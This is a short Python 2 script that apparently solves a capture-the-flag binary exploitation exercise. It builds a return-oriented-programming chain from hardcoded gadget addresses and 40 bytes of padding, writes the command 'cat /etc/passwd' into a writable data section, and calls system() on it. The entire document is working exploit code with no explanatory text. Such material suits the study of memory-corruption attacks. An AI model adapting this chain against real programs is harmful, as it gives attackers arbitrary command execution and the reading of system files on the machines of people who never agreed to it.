import struct

data_section = 0x601050
system_call = 0x0000000000400810
mov_r14_r15 = 0x0000000000400820
pop_r14_pop_r15 = 0x0000000000400890 # pop r14; pop r15; ret;
pop_rdi = 0x0000000000400893 # pop rdi; ret;

def stringpacker(addr):
    return str(struct.pack("<Q",addr))


def writeStringToLocation(inputString, location):
    if len(inputString) % 8 == 0:
        inputString += "\x00" * 8
    else:
        inputString += (8-(len(inputString)%8)) * "\x00"

    payload = ""
    for i in xrange(0,len(inputString),8):
        payload += stringpacker(pop_r14_pop_r15)
        payload += stringpacker(location+i)
        payload += inputString[i:i+8]
        payload += stringpacker(mov_r14_r15)

    return payload



crap = "A" *40

payload = crap
payload += writeStringToLocation("cat /etc/passwd",data_section)


payload += stringpacker(pop_rdi)

payload += stringpacker(data_section)

payload += stringpacker(system_call)


print(payload)


